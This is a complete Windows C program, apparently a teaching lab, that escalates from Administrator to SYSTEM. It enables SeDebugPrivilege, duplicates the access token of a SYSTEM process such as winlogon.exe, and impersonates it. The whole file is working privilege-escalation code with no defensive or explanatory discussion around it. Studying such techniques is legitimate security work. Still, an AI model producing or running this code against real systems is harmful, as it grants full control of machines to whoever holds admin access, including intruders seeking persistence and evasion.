#include <windows.h>
#include <stdio.h>

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) { CloseHandle(hToken); return FALSE; }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

void PrintCurrentUsername(const char* state) {
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        printf("[*] Current User Context (%s): %s\n", state, username);
    } else {
        printf("[-] Failed to get username. Error: %lu\n", GetLastError());
    }
}

int main() {
    printf("Token Impersonation Lab (Admin -> SYSTEM)\n");
    printf("=========================================\n\n");

    DWORD targetPid = 0;
    printf("Enter target SYSTEM PID (e.g., winlogon.exe or spoolsv.exe): ");
    if (scanf("%lu", &targetPid) != 1) {
        printf("[-] Invalid PID.\n");
        return 1;
    }
    printf("\n");

    PrintCurrentUsername("BEFORE IMPERSONATION");

    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled successfully.\n");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Successfully opened target process token.\n");

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Token duplicated successfully (SecurityImpersonation).\n");

    if (!ImpersonateLoggedOnUser(hDupToken)) {
        printf("[-] ImpersonateLoggedOnUser failed. Error: %lu\n", GetLastError());
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("\n[+] BOOM! Impersonation Successful!\n");
    
    PrintCurrentUsername("DURING IMPERSONATION");

    RevertToSelf();
    printf("\n[+] RevertToSelf executed. Dropping the mask...\n");

    PrintCurrentUsername("AFTER REVERT");

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    
    printf("\n[+] Lab completed successfully.\n");
    return 0;
}